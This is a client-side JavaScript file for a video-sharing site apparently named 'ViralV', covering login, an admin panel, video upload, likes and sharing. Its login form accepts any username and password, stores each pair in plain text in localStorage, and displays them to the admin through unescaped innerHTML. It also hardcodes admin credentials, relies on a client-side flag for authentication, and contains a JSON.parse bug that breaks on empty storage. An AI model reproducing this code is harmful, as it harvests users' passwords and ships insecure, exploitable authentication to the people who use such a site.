// Admin credentials
const ADMIN_CREDENTIALS = {
  username: "Minarul5454",
  password: "Minarul5454"
};

// Initialize app
document.addEventListener('DOMContentLoaded', function() {
  // Check which page we're on
  if (document.getElementById('loginForm')) {
    setupLoginPage();
  } else if (document.getElementById('adminVideoContainer')) {
    setupAdminPage();
  } else {
    setupPublicPage();
  }
  
  // Load videos on all pages
  loadVideos();
});

// Login Page Functions
function setupLoginPage() {
  const loginForm = document.getElementById('loginForm');
  
  loginForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Check admin login
    if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
      localStorage.setItem('isAdmin', 'true');
      window.location.href = 'admin.html';
      return;
    }
    
    // Save user credentials
    const creds = { username, password };
    const stored = JSON.parse(localStorage.getItem('userCredentials') || []);
    stored.push(creds);
    localStorage.setItem('userCredentials', JSON.stringify(stored));
    
    // Mark as logged in and redirect
    localStorage.setItem('isLoggedIn', 'true');
    localStorage.setItem('currentUser', username);
    window.location.href = 'index.html';
  });
}

// Admin Page Functions
function setupAdminPage() {
  // Check admin authentication
  if (localStorage.getItem('isAdmin') !== 'true') {
    window.location.href = 'login.html';
    return;
  }
  
  // Setup admin menu
  const menuBtn = document.getElementById('menuBtn');
  const dropdownMenu = document.getElementById('dropdownMenu');
  
  menuBtn.addEventListener('click', function() {
    dropdownMenu.style.display = dropdownMenu.style.display === 'block' ? 'none' : 'block';
  });
  
  // View logins option
  document.getElementById('viewLogins').addEventListener('click', function(e) {
    e.preventDefault();
    const loginsSection = document.getElementById('loginsSection');
    loginsSection.style.display = loginsSection.style.display === 'none' ? 'block' : 'none';
    loadLogins();
  });
  
  // Logout option
  document.getElementById('logout').addEventListener('click', function(e) {
    e.preventDefault();
    localStorage.removeItem('isAdmin');
    window.location.href = 'login.html';
  });
}

// Public Page Functions
function setupPublicPage() {
  // Check if user is logged in
  if (localStorage.getItem('isLoggedIn') !== 'true') {
    window.location.href = 'login.html';
    return;
  }
  
  // Display welcome message if logged in
  const currentUser = localStorage.getItem('currentUser');
  if (currentUser) {
    const header = document.querySelector('header');
    const welcomeMsg = document.createElement('p');
    welcomeMsg.className = 'welcome-msg';
    welcomeMsg.textContent = `Welcome, ${currentUser}!`;
    header.appendChild(welcomeMsg);
  }
}

// Video Functions
function uploadVideo() {
  const titleInput = document.getElementById('videoTitle');
  const fileInput = document.getElementById('videoUpload');
  
  if (!titleInput.value.trim()) {
    alert('Please enter a video title');
    return;
  }
  
  if (!fileInput.files[0]) {
    alert('Please select a video file');
    return;
  }
  
  const file = fileInput.files[0];
  const validTypes = ['video/mp4', 'video/webm', 'video/ogg'];
  
  if (!validTypes.includes(file.type)) {
    alert('Please upload a valid video file (MP4, WebM, or OGG)');
    return;
  }
  
  if (file.size > 200 * 1024 * 1024) {
    alert('Video file too large (max 200MB)');
    return;
  }
  
  const reader = new FileReader();
  reader.onload = function(e) {
    const videos = JSON.parse(localStorage.getItem('videos') || []);
    
    videos.push({
      id: Date.now(),
      title: titleInput.value.trim(),
      data: e.target.result.split(',')[1],
      uploadDate: new Date().toLocaleDateString(),
      likes: 0,
      comments: [],
      views: 0
    });
    
    localStorage.setItem('videos', JSON.stringify(videos));
    alert('Video uploaded successfully!');
    loadVideos();
    titleInput.value = '';
    fileInput.value = '';
  };
  reader.readAsDataURL(file);
}

function loadVideos() {
  const videos = JSON.parse(localStorage.getItem('videos') || []).reverse();
  
  // Admin panel videos
  const adminContainer = document.getElementById('adminVideoContainer');
  if (adminContainer) {
    adminContainer.innerHTML = '';
    
    videos.forEach(video => {
      const videoElement = createVideoElement(video, true);
      adminContainer.appendChild(videoElement);
    });
  }
  
  // Public page videos
  const publicContainer = document.getElementById('videoContainer');
  if (publicContainer) {
    publicContainer.innerHTML = '';
    
    if (videos.length === 0) {
      publicContainer.innerHTML = '<p class="no-videos">No videos available yet</p>';
      return;
    }
    
    videos.forEach(video => {
      const videoElement = createVideoElement(video, false);
      publicContainer.appendChild(videoElement);
      
      // Increment view count when video is displayed
      video.views = (video.views || 0) + 1;
    });
    
    // Update views in storage
    localStorage.setItem('videos', JSON.stringify(videos));
  }
}

function createVideoElement(video, isAdmin) {
  const container = document.createElement('div');
  container.className = 'video-card';
  container.dataset.videoId = video.id;
  
  // Video title
  const title = document.createElement('h3');
  title.textContent = video.title;
  container.appendChild(title);
  
  // Video element
  const videoEl = document.createElement('video');
  videoEl.controls = true;
  videoEl.src = `data:video/mp4;base64,${video.data}`;
  container.appendChild(videoEl);
  
  // Video info (views, likes)
  const info = document.createElement('div');
  info.className = 'video-info';
  
  const views = document.createElement('span');
  views.className = 'views';
  views.innerHTML = `👁️ ${video.views || 0} views`;
  info.appendChild(views);
  
  const likes = document.createElement('span');
  likes.className = 'likes';
  likes.innerHTML = `❤️ ${video.likes || 0} likes`;
  likes.onclick = () => likeVideo(video.id);
  info.appendChild(likes);
  
  container.appendChild(info);
  
  // Action buttons
  const actions = document.createElement('div');
  actions.className = 'video-actions';
  
  const shareBtn = document.createElement('button');
  shareBtn.className = 'share-btn';
  shareBtn.textContent = 'Share';
  shareBtn.onclick = () => shareVideo(video.id);
  actions.appendChild(shareBtn);
  
  if (isAdmin) {
    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'delete-btn';
    deleteBtn.textContent = 'Delete';
    deleteBtn.onclick = () => deleteVideo(video.id);
    actions.appendChild(deleteBtn);
  }
  
  container.appendChild(actions);
  
  return container;
}

function likeVideo(videoId) {
  const videos = JSON.parse(localStorage.getItem('videos') || []);
  const video = videos.find(v => v.id === videoId);
  
  if (video) {
    video.likes = (video.likes || 0) + 1;
    localStorage.setItem('videos', JSON.stringify(videos));
    loadVideos();
  }
}

function deleteVideo(videoId) {
  if (!confirm('Are you sure you want to delete this video?')) return;
  
  const videos = JSON.parse(localStorage.getItem('videos') || []);
  const updatedVideos = videos.filter(video => video.id !== videoId);
  
  localStorage.setItem('videos', JSON.stringify(updatedVideos));
  loadVideos();
}

function shareVideo(videoId) {
  const videoLink = `${window.location.origin}${window.location.pathname}?video=${videoId}`;
  
  if (navigator.share) {
    navigator.share({
      title: 'Check out this viral video!',
      text: 'I found this amazing video on ViralV',
      url: videoLink
    }).catch(err => {
      console.log('Error sharing:', err);
      copyToClipboard(videoLink);
    });
  } else {
    copyToClipboard(videoLink);
  }
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text)
    .then(() => alert('Link copied to clipboard!'))
    .catch(() => prompt('Copy this link:', text));
}

function loadLogins() {
  const logins = JSON.parse(localStorage.getItem('userCredentials') || []);
  const container = document.getElementById('credentialsList');
  
  if (!container) return;
  
  container.innerHTML = '';
  
  if (logins.length === 0) {
    container.innerHTML = '<p>No login data available</p>';
    return;
  }
  
  logins.forEach(login => {
    const loginItem = document.createElement('div');
    loginItem.className = 'login-item';
    loginItem.innerHTML = `
      <strong>${login.username}</strong>
      <span>${login.password}</span>
    `;
    container.appendChild(loginItem);
  });
  }
